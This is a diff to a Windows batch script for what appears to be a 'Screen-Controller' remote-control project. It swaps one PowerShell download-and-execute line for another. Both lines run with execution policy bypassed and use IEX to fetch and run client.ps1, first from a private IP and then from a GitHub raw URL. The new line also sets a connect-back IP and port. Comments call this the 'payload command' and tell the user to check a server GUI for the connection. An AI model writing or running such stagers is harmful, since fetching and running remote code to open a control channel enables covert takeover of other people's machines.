@@ -8,8 +8,8 @@ echo Make sure servers are running first!
 echo.
 pause
 
-REM Start the payload command
-powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
+REM Start the payload command (GitHub version)
+powershell -NoP -Exec Bypass -C "$c='192.168.8.158';$p=5555;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"
 
 echo.
 echo Test complete. Check your server GUI for connection.
